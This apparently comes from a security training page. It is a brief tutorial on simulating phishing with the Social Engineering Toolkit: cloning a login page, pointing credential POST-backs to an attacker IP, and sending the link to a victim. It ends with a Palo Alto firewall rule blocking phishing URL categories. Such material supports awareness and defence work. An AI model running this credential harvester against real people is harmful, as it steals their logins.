Phishing Simulation

Use the Social Engineering Toolkit (SET) to clone a website and harvest credentials.

1
Launch SET

Start the Social Engineering Toolkit on Kali Linux.

sudo setoolkit

2
Select Attack Vector

Choose Website Attack Vectors, then Credential Harvester Attack.

1) Social-Engineering Attacks
2) Website Attack Vectors
3) Credential Harvester Attack
2) Site Cloner

3
Configure Cloner

Enter the IP address for the POST back (Kali Linux IP), and the URL of the site to clone (e.g., a login page).

IP address for the POST back in Harvester/Tabnabbing: 192.168.1.50
Enter the url to clone: http://example-login-page.com

4
Send Phishing Link

Send the victim (e.g., http://192.168.1.50) a link via email or chat. When they log in, their credentials will appear in the SET terminal.

🛡️ Mitigation (Palo Alto Firewall): Enable URL Filtering and DNS Sinkholing to block known phishing domains and prevent users from accessing malicious IPs. 
set rulebase security rules Block-Phishing-URLs
    from Trust
    to Untrust
    category [ phishing malware ]
    action deny
